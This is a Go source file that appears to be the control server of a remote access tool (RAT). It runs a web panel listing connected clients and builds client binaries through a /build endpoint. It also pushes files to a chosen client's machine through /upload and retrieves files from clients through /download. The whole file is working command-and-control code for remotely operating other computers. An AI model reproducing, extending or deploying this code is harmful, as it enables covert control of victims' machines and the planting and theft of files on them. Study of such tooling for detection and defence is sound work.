package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"rat/command/build"
	"rat/common"
	"strconv"
)

type TempFile struct {
	Path string
	Name string
}

// TempFiles contains mappings to downloaded files in temporary directory
var TempFiles map[string]TempFile

type ClientPage struct {
	*Client
}

func NewSingle(client *Client) ClientPage {
	return ClientPage{client}
}

func main() {
	config := Server{
		Address: "localhost:9999",
	}

	go Listen(&config)

	funcMap := template.FuncMap{
		"Version": func() string { return common.Version },
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("index.template.html").Funcs(funcMap).ParseFiles("web/index.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/build", func(w http.ResponseWriter, r *http.Request) {
		decoder := json.NewDecoder(r.Body)
		var config build.Config
		decoder.Decode(&config)
		err := build.Build(&config, w)

		if err != nil {
			fmt.Println("build:", err.Error())
			w.Write([]byte(err.Error()))
		}
	})
	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
		dir := r.PostFormValue("directory")

		file, header, err := r.FormFile("file")

		if err != nil {
			fmt.Println(err.Error())
		}

		id, _ := strconv.Atoi(r.PostFormValue("id"))
		client := GetClient(id)

		remote := dir + header.Filename
		fmt.Println("Remote file:", remote)

		err = StartTransfer(client, file, remote)
		if err != nil {
			fmt.Println("upload:", err.Error())
		}
	})
	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
		if file, ok := TempFiles[r.FormValue("key")]; ok {
			w.Header().Set("Content-Disposition", "attachment; filename="+file.Name)

			http.ServeFile(w, r, file.Path)
		}
	})
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))

	InitControlSocket()

	log.Fatal(http.ListenAndServeTLS("localhost:7777", "cert.pem", "private.key", nil))
}

func init() {
	InitPackets()
	TempFiles = make(map[string]TempFile)
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}
